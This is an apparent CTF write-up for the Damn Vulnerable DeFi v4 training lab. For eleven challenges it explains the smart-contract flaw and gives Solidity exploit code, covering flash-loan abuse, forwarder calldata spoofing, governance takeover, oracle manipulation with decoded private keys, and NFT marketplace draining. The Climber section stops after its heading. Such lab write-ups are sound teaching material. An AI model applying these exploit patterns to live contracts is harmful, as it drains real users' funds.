## Damn Vulnerable DeFi v4 Writeup

Writeup by [SunSec](https://x.com/1nf0s3cpt)

![Screenshot 2024-09-11 at 10 18 33 AM](https://github.com/user-attachments/assets/7e3df1a1-3fc6-4d01-8860-88e06ef820f1)

### 1. Unstoppable
--- 
[Challenge](https://www.damnvulnerabledefi.xyz/challenges/unstoppable/): 

Condition:
- Make the `flashLoan` function unable to work.

Key Concepts:
- Flash Loan
- DOS

Solution:
- By simply transferring tokens to the contract, you can make `totalSupply != balanceBefore`, causing the flash loan to fail.


```
 if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); 
```

[POC:](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/unstoppable/Unstoppable.t.sol) 
```
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 123);   
    }
```



### 2. Naive Receiver

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/): 

Conditions:
- Must execute two or fewer transactions. Ensure `vm.getNonce(player)` is less than or equal to 2.
- Ensure `weth.balanceOf(address(receiver))` equals 0.
- Ensure `weth.balanceOf(address(pool))` equals 0.
- Ensure `weth.balanceOf(recovery)` equals `WETH_IN_POOL + WETH_IN_RECEIVER = 1010 ETH`.

Key Concepts:
- Flash Loan
- Create an attack contract to satisfy completing the attack in a single transaction
- MultiCall
- `msg.data` (calldata manipulation)

Solution:
- `NaiveReceiverPool` inherits `Multicall` and `IERC3156FlashLender`.  
  [ERC-3156](https://eips.ethereum.org/EIPS/eip-3156): Flash loan module and {ERC20} extension that allows flash loans.
- The `FlashLoanReceiver` initially has 10 ETH, and each time it receives a flash loan, it pays 1 ETH as a fee to the pool. However, the issue lies in the fact that `onFlashLoan` does not check whether the origin of the flash loan is authorized. So we just need to call 10 times flash loans, passing 0 as the amount, and we can drain the 10 ETH from `FlashLoanReceiver`. But the problem requires that the Nonce must be less than 2. As mentioned earlier, `NaiveReceiverPool` inherits `Multicall`, so we can use `Multicall` to perform 10 flash loan operations in a single transaction, thus satisfying the Nonce requirement of being less than 2.
- Next, we need to figure out how to drain the initial 1000 ETH from `NaiveReceiverPool`. From the contract, we can see that the only function that can transfer the assets is `withdraw`. It can be noticed that `_msgSender` needs to satisfy `msg.sender == trustedForwarder && msg.data.length >= 20` to return the last 20 bytes of the address, which can be manipulated.
- Finally, to satisfy `msg.sender == trustedForwarder`, we need to use a forwarder to execute a meta-transaction.


```
    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }
    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
            //bytes20： msg.data last 20 bytes to address
        } else {
            return super._msgSender();
        }
    }

```
[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/naive-receiver/NaiveReceiver.t.sol) : 
```
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );
        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            gasleft(),
            forwarder.nonces(player),
            callData,
            1 days
        );
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }
```

### 3. Truster

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/truster/) 

Conditions:
- Only 1 transaction can be executed
- Rescue funds must be sent to the `recovery` account

Key Concepts:
- Arbitrary call

Solution:
- In `flashLoan`, we can see `target.functionCall(data);` which allows executing arbitrary calldata, and the target address is controllable. Therefore, arbitrary instructions can be executed directly.


[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/truster/Truster.t.sol) : 
```
    function test_truster() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(address(pool), address(token),address(recovery));
    }
    
 contract Exploit {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(address _pool, address _token, address recoveryAddress) payable {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), TOKENS_IN_POOL);
        pool.flashLoan(0, address(this), _token, data);
        DamnValuableToken token = DamnValuableToken(_token);
        token.transferFrom(_pool, address(recoveryAddress), TOKENS_IN_POOL);
    }
}
```

### 4. Side Entrance

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/side-entrance/)

Conditions:
- The pool's balance must be 0.
- The balance in the specified `Recovery` wallet must equal the original amount of ETH in the pool (i.e., `ETHER_IN_POOL`).

Key Concepts:
- Incorrect use of `address(this).balance` as a validation method

Solution:
- `flashLoan` uses a non-standard approach, where it checks if the loan is repaid simply by comparing the pool’s balance `if (address(this).balance < balanceBefore)`. 
- So, by borrowing through `flashLoan` and then depositing the funds back into the pool, it counts as repayment. Meanwhile, since you have proof of deposit in the contract, you can execute a `withdraw` and transfer the funds out.


[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/SideEntrance/SideEntrance.t.sol) : 
```
    function test_sideEntrance() public checkSolvedByPlayer {
        Exploit exploiter = new Exploit(address(pool), recovery, ETHER_IN_POOL);
        exploiter.attack();
    }
contract Exploit{
    SideEntranceLenderPool public pool;
    address public recovery;
    uint public exploitAmount;
    constructor(address _pool, address _recovery, uint _amount){  
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        exploitAmount = _amount;
    }
    function attack() external returns(bool){
        pool.flashLoan(exploitAmount);
        pool.withdraw();
        payable(recovery).transfer(exploitAmount);
    }
    function execute() external payable{
        pool.deposit{value:msg.value}();
    }
    receive() external payable{}
}

```
### 5. The Rewarder
[Challenge](https://www.damnvulnerabledefi.xyz/challenges/the-rewarder/)

Conditions:
- The remaining DVT amount in the distributor contract must be less than 1e16 (i.e., 0.01 DVT), only allowing a small amount of "Dust" to remain.
- The remaining WETH amount in the distributor contract must be less than 1e15 (i.e., 0.001 WETH), only allowing a small amount of "Dust" to remain.
- The amount of DVT in the specified `Recovery` wallet must equal the total distribution amount of DVT (`TOTAL_DVT_DISTRIBUTION_AMOUNT`), minus the amount of DVT Alice has already claimed (`ALICE_DVT_CLAIM_AMOUNT`), and the remaining amount of DVT in the distributor contract.
- The amount of WETH in the specified `Recovery` wallet must equal the total distribution amount of WETH (`TOTAL_WETH_DISTRIBUTION_AMOUNT`), minus the amount of WETH Alice has already claimed (`ALICE_WETH_CLAIM_AMOUNT`), and the remaining amount of WETH in the distributor contract.

Key Concepts:
- Logic error in updating the state of an array

Solution:
- Based on Merkle proofs and bitmaps token distribution contract.
- REF: [Bitmaps & Merkle Proofs](https://x.com/DegenShaker/status/1825835855140868370) | [Application of Bitmap structure in ENSToken](https://mirror.xyz/franx.eth/0PTXWm1ynYxeF11S_xlXzmQqeICHQeI4tz3Uwz9aWuk)
- In the contract, it can be seen that in `claimRewards`, the update to whether a user has claimed rewards is done through `_setClaimed()`.
- Since `claimRewards` supports arrays, multiple claims can be made in a single transaction, and the user's reward claim record is only updated after the last claim.
- The `player`'s address has an index of 188.

```
            // for the last claim
            if (i == inputClaims.length - 1) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }
```
[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/the-rewarder/TheRewarder.t.sol) : 
```
   function test_theRewarder() public checkSolvedByPlayer {
        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

        bytes32[] memory dvtLeaves = _loadRewards(
            "/test/the-rewarder/dvt-distribution.json"
        );
        bytes32[] memory wethLeaves = _loadRewards(
            "/test/the-rewarder/weth-distribution.json"
        );

        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT /
            PLAYER_DVT_CLAIM_AMOUNT;
        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT /
            PLAYER_WETH_CLAIM_AMOUNT;
        uint totalTxCount = dvtTxCount + wethTxCount;

        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        console.log(totalTxCount);
        Claim[] memory claims = new Claim[](totalTxCount);

        for (uint i = 0; i < totalTxCount; i++) {
            if (i < dvtTxCount) {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_DVT_CLAIM_AMOUNT,
                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(dvtLeaves, 188) //player at index 188
                });
            } else {
                claims[i] = Claim({
                    batchNumber: 0, // claim corresponds to first DVT batch
                    amount: PLAYER_WETH_CLAIM_AMOUNT,
                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array
                    proof: merkle.getProof(wethLeaves, 188)  //player at index 188
                });
            }
        }
        //multiple claims
        distributor.claimRewards({
            inputClaims: claims,
            inputTokens: tokensToClaim
        });

        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }
    
```

### 6. Selfie

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/selfie/)

Conditions:
- The DVT balance in the pool must be 0.
- The balance in the specified `Recovery` wallet must equal the original amount of DVT in the pool (i.e., `TOKENS_IN_POOL`).

Key Concepts:
- Flash loan
- Vote delegation (`delegate`)
- Governance mechanism

Solution:
- The `SelfiePool` contract has a function `emergencyExit()` that can transfer all the contract's balance, but it requires `onlyGovernance` permission.
- Upon reviewing the `SimpleGovernance` contract, it is possible to initiate a proposal through `queueAction`, and the data can be controlled. This allows us to execute `emergencyExit()` via this method.
- To execute `queueAction`, it must pass the `_hasEnoughVotes` check. Since `DamnValuableVotes` inherits `ERC20Votes`, the borrowed DVT needs to delegate voting power to oneself. Holding half of the total supply of voting power is required to submit the proposal.
- Exploit steps: Flashloan -> delegate -> initiate proposal with `queueAction` -> repay -> execute `executeAction`


[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/selfie/selfie.t.sol) : 
```
    function test_selfie() public checkSolvedByPlayer {
        Exploit exploiter = new Exploit(
            address(pool),
            address(governance),
            address(token)
        );
        exploiter.exploitSetup(address(recovery));
        vm.warp(block.timestamp + 2 days);
        exploiter.exploitCloseup();
    }

contract Exploit is IERC3156FlashBorrower{
    SelfiePool selfiePool;
    SimpleGovernance simpleGovernance;
    DamnValuableVotes damnValuableToken;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    constructor(
        address _selfiePool, 
        address _simpleGovernance,
        address _token
    ){
        selfiePool = SelfiePool(_selfiePool);
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        damnValuableToken = DamnValuableVotes(_token);
    }
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){
        damnValuableToken.delegate(address(this));
        uint _actionId = simpleGovernance.queueAction(
            address(selfiePool),
            0,
            data
        );
        actionId = _actionId;
        IERC20(token).approve(address(selfiePool), amount+fee);
        return CALLBACK_SUCCESS;
    }

    function exploitSetup(address recovery) external returns(bool){
        uint amountRequired = 1_500_000e18;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", recovery);
        selfiePool.flashLoan(IERC3156FlashBorrower(address(this)), address(damnValuableToken), amountRequired, data);
    }
    function exploitCloseup() external returns(bool){
        bytes memory resultData = simpleGovernance.executeAction(actionId);
    }
}
```

### 7. Compromised

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/compromised/)
```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```
A related on-chain exchange is selling a collection called “DVNFT” at an absurdly high price, currently priced at 999 ETH each. This price is determined by an on-chain oracle based on three trusted reporters: 0x188...088, 0xA41...9D8, and 0xab3...a40. You start with an account balance of only 0.1 ETH and must complete the challenge by rescuing all the ETH available in the exchange and depositing the funds into the specified recovery account.

Conditions:
- The ETH balance in the `exchange` contract address must be 0.
- The ETH balance in the `recovery` address must equal the initial ETH balance of the `exchange`.
- The player's NFT balance must be 0.
- The price of DVNFT in the oracle must remain unchanged, equal to the initial NFT price (`INITIAL_NFT_PRICE`), ensuring no price manipulation during the challenge.

Key Concepts:
- Wallet private key
- Oracle price setting

Solution:
- After decoding the leaked_information, it reveals two wallet private keys. These two wallets can set the oracle price.
```
import base64

def hex_to_ascii(hex_str):
    ascii_str = ''
    for i in range(0, len(hex_str), 2):
        ascii_str += chr(int(hex_str[i:i+2], 16))
    return ascii_str

def decode_base64(base64_str):
    # Decode Base64 to ASCII
    return base64.b64decode(base64_str).decode('utf-8')

leaked_information = [
    '4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30',
    '4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35',
]

from eth_account import Account

for leak in leaked_information:
    hex_str = ''.join(leak.split())
    ascii_str = hex_to_ascii(hex_str)
    decoded_str = decode_base64(ascii_str)
    private_key = decoded_str
    print("Private Key:", private_key)
    
    # Create a wallet instance from the private key
    wallet = Account.from_key(private_key)
    
    # Get the public key (address)
    address = wallet.address
    print("Wallet address:", address)

Private Key: 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
Wallet address: 0x188Ea627E3531Db590e6f1D71ED83628d1933088
Private Key: 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
Wallet address: 0xA417D473c40a4d42BAd35f147c21eEa7973539D8

```
- Manipulate the NFT price, buy low and sell high to gain more ETH.

[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/compromised/Compromised.t.sol) : 
```
    function test_compromised() public checkSolved {
        Exploit exploit = new Exploit{value:address(this).balance}(oracle, exchange, nft, recovery);
        vm.startPrank(sources[0]);
        oracle.postPrice(symbols[0],0);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[0],0);
        vm.stopPrank();

        exploit.buy();

        vm.startPrank(sources[0]);
        oracle.postPrice(symbols[0],999 ether);
        vm.stopPrank();
        vm.startPrank(sources[1]);
        oracle.postPrice(symbols[0],999 ether);
        vm.stopPrank();
        exploit.sell();
        exploit.recover(999 ether);
    }
    contract Exploit is IERC721Receiver{
    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    uint nftId;
    address recovery;
    constructor(    
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }
    function buy() external payable{
        uint _nftId = exchange.buyOne{value:1}();
        nftId = _nftId;
    }
    function sell() external payable{
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }
    function recover(uint amount) external {
        payable(recovery).transfer(amount);
    }
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){
        return this.onERC721Received.selector;
    }
    receive() external payable{
    }
}
```

### 8. Puppet

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/puppet/)

Conditions:
- Ensure only one transaction is executed.
- The DVT tokens in the `lendingPool` must be 0.
- Transfer all DVT tokens to the `recovery` wallet.

Key Concepts:
- Incorrect use of `balanceOf` as a reference for pricing.

Solution:
- In many past hacking incidents, using the contract's balance as a condition is very dangerous and can be manipulated. In `PuppetPool`, we can see that `_computeOraclePrice` uses the balance to calculate the oracle price.
- In many past hacking incidents, using the contract's balance as a condition is very dangerous and can be manipulated. In `PuppetPool`, we can see that `_computeOraclePrice` uses the balance to calculate the oracle price.

```
    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
```
- Transfer all your DVT tokens to `uniswapV1Exchange` via `tokenToEthTransferInput` to manipulate the price.

[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/puppet/Puppet.t.sol) : 
```
    function test_puppet() public checkSolvedByPlayer {
        Exploit exploit = new Exploit{value:PLAYER_INITIAL_ETH_BALANCE}(
            token,
            lendingPool,
            uniswapV1Exchange,
            recovery
        );
        token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
        exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
    }

contract Exploit {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;
    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery 
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }
    function attack(uint exploitAmount) public {
        uint tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        console.log("before calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 1, block.timestamp, address(this));
        console.log(token.balanceOf(address(uniswapV1Exchange)));
        console.log("after calculateDepositRequired(amount)",lendingPool.calculateDepositRequired(exploitAmount));
        lendingPool.borrow{value: 20e18}(
            exploitAmount,
            recovery
        );
    }
    receive() external payable {
    }
}
  before calculateDepositRequired(amount) 200000000000000000000000
  after calculateDepositRequired(amount) 19664329888798200000
```

### 9. Puppet V2

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/puppet-v2/)

Conditions:
- The DVT tokens in the `lendingPool` must be 0.
- Transfer all DVT tokens to the `recovery` wallet.

Key Concepts:
- Incorrect use of `getReserves` as a reference for pricing.

Solution:
- In this challenge, the oracle has been changed to use Uniswap v2. However, `getReserves` is similar to fetching the balance, which poses a risk of manipulation.


[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/puppet-v2/PuppetV2.t.sol) : 
```

    // Fetch the price from Uniswap v2 using the official libraries
    function (uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

        return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
    }
```
- By using swapExactTokensForTokens to exchange all of the player's DVT for WETH, you can lower the DVT price.
```
    function test_puppetV2() public checkSolvedByPlayer {

        token.approve(address(uniswapV2Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        console.log("before alculateDepositOfWETHRequired",lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
        uniswapV2Router.swapExactTokensForETH(token.balanceOf(player), 1 ether, path, player, block.timestamp);

        weth.deposit{value: player.balance}();
   
        weth.approve(address(lendingPool), type(uint256).max);
        uint256 poolBalance = token.balanceOf(address(lendingPool));
        uint256 depositOfWETHRequired = lendingPool.calculateDepositOfWETHRequired(poolBalance);
        console.log("after alculateDepositOfWETHRequired",lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery,POOL_INITIAL_TOKEN_BALANCE);

    }
  before alculateDepositOfWETHRequired 300000000000000000000000
  after alculateDepositOfWETHRequired 29496494833197321980

```

### 10. Free Rider

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/free-rider/)

Conditions:
- Ensure all NFTs are withdrawn from the `recoveryManager` smart contract and transferred to the `recoveryManagerOwner` address.
- There should no longer be any NFTs for sale in the marketplace, meaning `offersCount()` should be 0.
- The player's balance must be greater than or equal to the bounty amount.

Key Concepts:
- Uniswap flashswap
- Incorrect validation of `mas.value` in an array

Solution:
- In the `_buyOne` function for purchasing NFTs, there is an error in checking the payment amount. As long as `msg.value` is greater than `priceToPay`, the transaction can proceed.

```
        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }
```
- If you only purchase one NFT, there is no issue. However, the contract allows purchasing multiple NFTs at once through `buyMany()`, which loops through and calls `_buyOne`. This creates a logical flaw: with just 15 ETH (the price of one NFT), you can buy multiple NFTs.
```
    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            unchecked {
                _buyOne(tokenIds[i]);
            }
        }
    }
```
- The second logical error is also in `_buyOne`. After purchasing the NFT, 15 ETH is transferred to the seller. However, the program actually transfers NFT ownership, so the 15 ETH is mistakenly transferred to the buyer instead.
```
        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller using cached token
        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
```
- By leveraging the two bugs above, you can use `uniswapV2 flashswap` to borrow 15 ETH and buy multiple NFTs. In the end, your cost is only the 0.3% flashswap fee. Since the challenge starts you with 0.1 ETH, this is more than sufficient.
- The final step is to buy 6 NFTs and transfer them all to `FreeRiderRecoveryManager` to collect the 45 ETH bounty. [REF](https://medium.com/@JohnnyTime/damn-vulnerable-defi-v3-challenge-10-solution-free-rider-complete-walkthrough-7da8122691b3)
```
        if (++received == 6) {
            address recipient = abi.decode(_data, (address));
            payable(recipient).sendValue(bounty);
        }
```
[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/free-rider/FreeRider.t.sol) : 

```
    function test_freeRider() public checkSolvedByPlayer {
        Exploit exploit = new Exploit{value:0.045 ether}(
            address(uniswapPair),
            address(marketplace),
            address(weth),
            address(nft),
            address(recoveryManager)
        );
        exploit.attack();
        console.log("balance of attacker:", address(player).balance / 1e15, "ETH");
    }
contract Exploit {
    
    IUniswapV2Pair public pair;
    IMarketplace public marketplace;
    IWETH public weth;
    IERC721 public nft;
    address public recoveryContract;
    address public player;
    uint256 private constant NFT_PRICE = 15 ether;
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract)payable{
        pair = IUniswapV2Pair(_pair);
        marketplace = IMarketplace(_marketplace);
        weth = IWETH(_weth);
        nft = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player = msg.sender;
    }

    function attack() external payable {
         // 1. Request a flashSwap of 15 WETH from Uniswap Pair  
        pair.swap(NFT_PRICE, 0, address(this), "1");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {

        // Access Control
        require(msg.sender == address(pair));
        require(tx.origin == player);

        // 2. Unwrap WETH to native ETH
        weth.withdraw(NFT_PRICE);

        // 3. Buy 6 NFTS for only 15 ETH total
        marketplace.buyMany{value: NFT_PRICE}(tokens);

        // 4. Pay back 15WETH + 0.3% to the pair contract
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
        weth.deposit{value: amountToPayBack}();
        weth.transfer(address(pair), amountToPayBack);

        // 5. Send NFTs to recovery contract so we can get the bounty
        bytes memory data = abi.encode(player);
        for(uint256 i; i < tokens.length; i++){
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
        }
        
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}
```

### 11. Backdoor

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/backdoor/)

Conditions:
- Only one transaction is executed.
- All users listed as beneficiaries must have already registered a wallet address in the registry.
- Users are no longer beneficiaries.
- All tokens are transferred to the recovery wallet.

Key Concepts:
- Safe contract wallet
- Proxy contract initialization

Solution:
- Safe = singletonCopy, SafeProxyFactory = walletFactory
- create a new Safe wallet: SafeProxyFactory.createProxyWithCallback -> createProxyWithNonce -> deployProxy -> ( if callback is defined ) callback.proxyCreated
- There are 4 beneficiaries in this challenge. Each beneficiary receives 10 ETH through the `WalletRegistry` by creating a wallet. The `proxyCreated` function notes that the wallet is created through a proxy. SafeProxyFactory::createProxyWithCallback, you can see code below. 
```
     * @notice Function executed when user creates a Safe wallet via SafeProxyFactory::createProxyWithCallback
     *          setting the registry's address as the callback.
    function proxyCreated

    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) public returns (SafeProxy proxy) {
        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    }
```
- At the end of the initializer, `deployProxy` is executed, and we can control it through `call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0)`. So, within the initializer, we can execute `Safe.setup` and control the third parameter, `to`, which refers to the contract address for an optional delegate call. You can specify any contract or one with a backdoor. Finally, in the fourth field, `data`, we can execute the data payload for the optional delegate call. Through this process, we can retrieve each beneficiary's ETH.
```
    function setup(
        address[] calldata _owners, //List of Safe owners.
        uint256 _threshold, //Number of required confirmations for a Safe transaction.
        address to, //   Contract address for optional delegate call.
        bytes calldata data, //Data payload for optional delegate call.
        address fallbackHandler
    ) 
```

[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/backdoor/Backdoor.t.sol) :
```
    function test_backdoor() public checkSolvedByPlayer {
             Exploit exploit = new Exploit(address(singletonCopy),address(walletFactory),address(walletRegistry),address(token),recovery);
             exploit.attack(users);
    }
contract Exploit {
    address private immutable singletonCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    DamnValuableToken private immutable dvt;
    address recovery;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _registry,
        address _token,
        address _recovery
    ) {
        singletonCopy = _masterCopy;
        walletFactory = _walletFactory;
        walletRegistry = _registry;
        dvt = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        // For every registered user we'll create a wallet
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Create the data that will be passed to the proxyCreated function on WalletRegistry
            // The parameters correspond to the GnosisSafe::setup() contract
            bytes memory _initializer = abi.encodeWithSelector(
                Safe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  List of Safe owners.
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data =>  Data payload for optional delegate call.
                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                0, // payment => Value that should be paid
                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
            );

            // Create new proxies on behalf of other users
        SafeProxy _newProxy = SafeProxyFactory(walletFactory).createProxyWithCallback(
         singletonCopy,  // _singleton => Address of singleton contract.
         _initializer,   // initializer => Payload for message call sent to new proxy contract.
         i,              // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
         IProxyCreationCallback(walletRegistry)  // callback => Cast walletRegistry to IProxyCreationCallback
);
            //Transfer to caller
            dvt.transferFrom(address(_newProxy), recovery, 10 ether);
        }
    }
}
```

### 12. Climber

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/climber/)

Conditions:
- Rescue the vault assets.
